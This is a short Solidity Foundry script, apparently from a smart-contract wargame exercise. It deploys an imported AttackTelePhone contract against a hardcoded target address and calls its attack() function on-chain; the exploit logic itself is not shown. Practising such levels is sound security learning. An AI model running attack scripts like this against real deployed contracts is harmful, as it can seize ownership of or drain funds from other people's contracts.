//SPDX-License-Identifier: MIT

import {AttackTelePhone} from "../src/AttackTelePhone.sol";
import {Script, console} from "forge-std/Script.sol";

pragma solidity ^0.8.18;

contract HackTelePhone is Script {
    address targetAddress = 0xD8345Fa465f6EA364311Ea64936bebe131309d8B;

    function run() external{
        vm.startBroadcast();
        AttackTelePhone attacktelephone = new AttackTelePhone(targetAddress);
        attacktelephone.attack();
        vm.stopBroadcast();
    }
}
